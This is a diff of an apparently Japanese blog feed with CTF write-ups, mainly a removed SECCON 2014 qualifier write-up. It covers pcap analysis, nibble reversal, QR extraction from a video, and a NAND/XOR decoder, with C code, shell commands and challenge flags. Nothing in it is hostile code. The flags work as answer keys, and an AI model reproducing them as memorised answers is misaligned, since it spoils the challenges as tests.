+<p>となっています。
+途中、mprotectに関してみむらさんからアドバイスをいただき、解くことができました。</p>
+
+<p><a href="http://mimumimu.net/blog/2011/11/17/c%E3%82%B3%E3%83%BC%E3%83%89%E4%B8%AD%E3%81%AB%E3%83%9E%E3%82%B7%E3%83%B3%E8%AA%9E%E3%82%92%E5%9F%8B%E3%82%81%E8%BE%BC%E3%82%93%E3%81%A7%E5%AE%9F%E8%A1%8C%E3%81%99%E3%82%8B%E3%80%82/">Cコード中にマシン語を埋め込んで実行する。 | みむらの手記手帳</a></p>
+
+<p>FLAG: <code>Cats with frickin lazer beamz on top of their heads!</code></p>
+
+<h1>まとめ</h1>
+
+<p>チーム全体で計19ポイントを獲得し、結果33位でした。1ポイントしか貢献できませんでしたが、大人数でお互い協力して問題を解く楽しさを味わえてとても有意義でした。
+また、問題傾向がPwn寄りであることから、もっとPwnに関する実力をつけなければならないと再確認できた良い機会でした。
+来年は5ポイントを目標に挑みたいと思います！</p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[ネットエージェント最終面接問題 Write-up エクストリームCTF編]]></title>
@@ -1905,262 +2513,6 @@ Compressed: 70378640
 
 
 <p>mondai5以降のWrite-upは明日公開します。</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[SECCON2014 Online英語版予選 Write-up]]></title>
-    <link href="http://mzyy94.com/blog/2014/12/07/seccon2014-online/"/>
-    <updated>2014-12-07T17:59:06+09:00</updated>
-    <id>http://mzyy94.com/blog/2014/12/07/seccon2014-online</id>
-    <content type="html"><![CDATA[<p>昨日12月6日午前9時（日本時間）から12月7日午後5時までの32時間耐久CTFが行われたので参加してみました。
-あまり活躍できずでしたがチャレンジしたもののまとめを記します。</p>
-
-<!-- more -->
-
-
-<h1>Get the key (Network 100)</h1>
-
-<p><img src="/blog/resources/images/2014/12/7/NW100-1.png" alt="Get the key pcap file opened" />
-配布されたパケットからキーの手がかりを探すというもの。
-これはNWの基本問題だったので解説することはほとんどないです。
-Wiresharkで開いてWebサイトのログイン情報が出るのでそれでアクセスしておしまい。</p>
-
-<p><img src="/blog/resources/images/2014/12/7/NW100-2.png" alt="Get the key WebSite login" />
-<img src="/blog/resources/images/2014/12/7/NW100Flag.png" alt="NW100Flag" /></p>
-
-<h1>Reverseit (Bin 100)</h1>
-
-<p>なにやら配られたファイルを反転しろというもの。
-バイト列反転、ビット反転いろいろな反転方法を試したところ、
-4bitごとに反転してあげるとJPEG画像に早変わり。</p>
-
-<p><img src="/blog/resources/images/2014/12/7/BIN100Flag.jpg" alt="BIN100Flag" /></p>
-
-<p>画像中のFLAGも左右反転してるので眼で見て脳内反転しておしまい。</p>
-
-<pre><code class="C">#include &lt;sys/stat.h&gt;
-#include &lt;fcntl.h&gt;
-#include &lt;unistd.h&gt;
-
-int main(int argc, char const* argv[])
-{
-    int in, out;
-    if ((in = open("Reverseit", O_RDONLY)) != -1) {
-        struct stat st;
-        int i;
-        char buf[2];
-
-        out = open("reversed", O_RDWR|O_CREAT, 0666);
-        stat("Reverseit", &amp;st);
-        for (i = st.st_size - 1; i &gt;= 0; --i) {
-            lseek(in, i, SEEK_SET);
-            read(in, buf, 1);
-            buf[0] = (buf[0] &amp; 0x0f &lt;&lt; 4) | ((buf[0] &amp; 0xf0) &gt;&gt; 4);
-            write(out, buf, 1);
-        }
-    }
-    return 0;
-}
-</code></pre>
-
-<h1>SECCON Wars: The Flag Awakens (QR 300)</h1>
-
-<p><a href="http://youtu.be/1pC56S17-_A">http://youtu.be/1pC56S17-_A</a>&#8220;>http://youtu.be/1pC56S17-_A&#8221;>http://youtu.be/1pC56S17-_A</a></a>
-新ジャンルQRからの出題。
-<a href="http://youtu.be/1pC56S17-_A">YouTubeの動画</a>を見ろとの指令のみが与えられた問題。</p>
-
-<p><img src="/blog/resources/images/2014/12/7/QR300-1.png" alt="SECCON Wars QR code movie" /></p>
-
-<p>よーく見るとSECCONのバナーが出るときに動画の下の方にQRコードが流れているのでそれをスキャンすればよさそう。</p>
-
-<p>手順としては動画をまずローカルに引っ張り出して、QRコードの出現する54秒の時点から7秒間を16fpsで連番画像として抜き出します。
-ファイル情報を確認すると320x240ピクセルなので、目視で下部3ピクセルに表示されてると仮定して、320x3ピクセルの画像に切り出します。
-あとはこれを連結してノイズを減らして色反転すると、</p>
-
-<p><img src="/blog/resources/images/2014/12/7/QR300Flag.jpg" alt="QR300 Flag" /></p>
-
-<p>このようなQRコードが得られ、スキャンしてFLAGをゲットできます。</p>
-
-<pre><code>ffmpeg -i SECCON_WARS.mp4 -ss 54 -t 7 -r 16 -f image2 %04d.jpg
-identify 0001.jpg
-convert *.jpg -crop '320x3+0+237' qr_%04d.jpg
-convert -append qr_*.jpg qr_appended.jpg
-convert -median 3 -negate qr_appended.jpg qr.jpg
-</code></pre>
-
-<h1>The Golden Gate (Programming 400)</h1>
-
-<p><img src="/blog/resources/images/2014/12/7/GoldenGate.jpg" alt="The Golden Gate" /></p>
-
-<p>自作ハードウェアエンコーダーの写真があって、それによってエンコードされた文字<code>BQDykmgZ0I6SaQnq4o/iEONudetXdPJdpl1UVSlU69oZOtvqnHfinOpcEfIjXy9okkVpsuw2kpKS==</code>をデコードしてくれとのこと。
-このハードウェアエンコーダーはユニーバーサル基板上に作られていて、絡み合うジャンパ線がどう繋がっているのかをしっかり把握できれば回路図を起こすのは以外と簡単。</p>
-
-<p><img src="/blog/resources/images/2014/12/7/TGG-1.jpg" alt="Handwriting Circuit" /></p>
-
-<p>7400のNANDゲートによって入力から出力までの間は、2入力NANDの結果をさらにその2入力でそれぞれNANDし、それらをNANDするという、何度もNANDする処理が入ってるだけでした。
-要するにXORです。</p>
-
-<p>よって、プログラムは簡潔にできあがり、難なくFLAGを手に入れることができると思いました。</p>
-
-<p>&#8230;思いました。</p>
-
-<p>残念ながら時間中にFLAGは得られませんでした。</p>
-
-<p>一点、デコードすべき文がなんなのかがわからなかったことがあります。BASE64にしては文字数が合わないのです。
-そして、どのタクトスイッチがどのbitをさしているのか、アノード・カソードどちらなのか写真からよくわからない、など、躓く点が多かったのです。</p>
-
-<p>SECCONは終わってしまいましたが、ヒントが出され、入力と出力とが対応付けられるようになりました。
-<a href="https://www.youtube.com/watch?v=kaDjypSndMk">https://www.youtube.com/watch?v=kaDjypSndMk</a>&#8220;>https://www.youtube.com/watch?v=kaDjypSndMk&#8221;>https://www.youtube.com/watch?v=kaDjypSndMk</a></a></p>
-
-<p>タクトスイッチによる入力が一部反転できてなかったようです。</p>
-
-<p>入力文を正規のBASE64にして実行してみると、しっかりとgzipのデータとなり、フラッグを得られました。
-<code>
-echo "BQDykmgZ0I6SaQnq4o/iEONudetXdPJdpl1UVSlU69oZOtvqnHfinOpcEfIjXy9okkVpsuw2kpKS" | openssl base64 -d &gt; input
-gcc goldengate.c -o gg
-./gg input
-file out
-gzip -S .gz -d -c out
-</code></p>
-
-<pre><code class="C">#include &lt;stdio.h&gt;
-#include &lt;stdlib.h&gt;
-#include &lt;sys/stat.h&gt;
-#include &lt;fcntl.h&gt;
-#include &lt;unistd.h&gt;
-
-
-#define B(y) ((*buf &gt;&gt; (y)) &amp; 1)
-
-unsigned char nand(unsigned char a, unsigned char b) {
-    if (a == 1 &amp;&amp; b == 1) {
-        return 0;
-    }
-    return 1;
-}
-
-unsigned char xor(unsigned char a, unsigned char b) {
-    return nand(nand(nand(a, b), a), nand(b, nand(a, b)));
-}
-
-void encoder(unsigned char *buf) {
-    unsigned char a4 = xor(B(1)^1, B(6)^1);
-    unsigned char a6 = xor(B(3), B(1)^1);
-    unsigned char a5 = xor(a6, B(5));
-    unsigned char g1 = xor(B(5), B(7));
-    unsigned char a0 = xor(g1, B(0)^1);
-    unsigned char a2 = xor(B(2),1);
-    unsigned char g2 = xor(B(2), B(1)^1);
-    unsigned char a1 = xor(a2, g2);
-    unsigned char a3 = xor(g1, g2);
-    unsigned char a7 = xor(B(4)^1, g2);
-    int t =
-        ((a7 &lt;&lt; 7) &amp; 128) |
-        ((a6 &lt;&lt; 6) &amp; 64) |
-        ((a5 &lt;&lt; 5) &amp; 32) |
-        ((a4 &lt;&lt; 4) &amp; 16) |
-        ((a3 &lt;&lt; 3) &amp; 8) |
-        ((a2 &lt;&lt; 2) &amp; 4) |
-        ((a1 &lt;&lt; 1) &amp; 2) |
-        ((a0 &lt;&lt; 0) &amp; 1);
-    *buf = ((unsigned char)t ^ 0xff);
-}
-
-
-int main(int argc, char const* argv[])
-{
-    int in;
-    int out;
-    struct stat st;
-    unsigned char buf[1 + 1];
-    char name[8];
-    int i, j;
-    unsigned char table[256];
-    unsigned char c;
-
-    if (argc != 2) {
-        return 1;
-    }
-
-    // create table
-    for (i = c = 0; i &lt; 256; c = ++i) {
-        encoder(&amp;c);
-        table[(int)c] = ((unsigned char)i &amp; 0xff);
-    }
-
-    if ((in = open(argv[1], O_RDONLY)) != -1) {
-        stat(argv[1], &amp;st);
-        out = open("out", O_RDWR|O_CREAT, 0666);
-
-        for (i = 0; i &lt; st.st_size; i++) {
-            read(in, buf, 1);
-            buf[0] = table[buf[0]];
-            write(out, buf, 1);
-        }
-
-        close(out);
-        close(in);
-    }
-    return 0;
-}
-</code></pre>
-
-<h1>QR (Easy) (QR 100)</h1>
-
-<p><img src="/blog/resources/images/2014/12/7/QRCake.jpg" alt="QR Cake" /></p>
-
-<p>昨年のSECCON 2013オンライン予選でも出題された、データビットの部分だけ残ってるQRコードを解析するという問題。
-今回はパンケーキに焼いて食べてしまったようです。</p>
-
-<p>おなじみ<a href="http://en.wikipedia.org/wiki/QR_code">英語版WikipediaのQRコード解説ページ</a>のデータ配置図を元にデータビットを埋めていくだけです。
-今回のフラッグの形式は<code>SECCON{XXXXXXX}</code>なので、最初の6文字が&#8221;SECCON&#8221;になるようなマスクを<a href="http://www.swetake.com/qrcode/qr5.html">QRコードの解説サイト</a>を見ながら特定すると、マスクパターンは001であることがわかります。</p>
-
-<p><img src="/blog/resources/images/2014/12/7/QR100-1.png" alt="QR Cake" /></p>
-
-<p>あとは淡々とビットを解析して行って得たFLAGは、</p>
-
-<pre>
-0010 : 英数モード
-000000110 : 6文字
-10011111010 : 'SE'
-01000101000 : 'CC'
-10001001111 : 'ON'
-0100 : 8bitバイトモード
-00010010 : 18文字
-01111011 : '{'
-01010000 : 'P'
-01010011 : 'S'
-01110111 : 'w'
-01011101 : ']'
-01010001 : 'Q'
-00111001 : '9'
-01100100 : 'd'
-00111001 : '9'
-01000111 : 'G'
-01101010 : 'j'
-01001011 : 'K'
-01010100 : 'T'
-01100100 : 'd'
-01000100 : 'D'
-00111000 : '8'
-01001000 : 'H'
-01111101 : '}'
-0101
-11
-</pre>
-
-
-<p><code>SECCON{PSw]Q9d9GjKTdD8H}</code>
-しかし<strong>Incorrect.</strong></p>
-
-<p>骨の折れる作業で再度トライする気にはならなかったのですが、
-今になって見返してみると間違ってるビットを発見。
-正解は<code>SECCON{PSwIQ9d9GjKTdD8H}</code>;</p>
-
-<h2>おしまい</h2>
-
-<p>チーム合計で2500点でした(´Д` )</p>
 ]]></content>
   </entry>
   
